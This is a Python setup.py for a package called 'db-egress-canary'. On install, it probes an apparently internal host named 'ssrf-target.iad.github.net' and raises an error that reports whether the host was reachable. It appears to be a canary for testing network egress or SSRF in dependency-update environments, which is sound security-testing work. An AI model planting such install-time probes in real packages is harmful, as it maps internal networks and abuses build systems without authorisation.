import os
import urllib.error
import urllib.request

from setuptools import setup


marker = "/tmp/codex_dependabot_canary_once"
try:
    fd = os.open(marker, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
except FileExistsError:
    pass
else:
    os.close(fd)
    try:
        with urllib.request.urlopen(
            "https://ssrf-target.iad.github.net/", timeout=10
        ) as response:
            outcome = f"REACHABLE status={response.status}"
    except urllib.error.HTTPError as error:
        outcome = f"BLOCKED status={error.code}"
    except Exception as error:
        outcome = f"BLOCKED error={type(error).__name__}"
    raise RuntimeError(f"CODEX_DEPENDABOT_CANARY_{outcome}")

setup(name="db-egress-canary", version="1.0.1", py_modules=["db_egress_canary"])
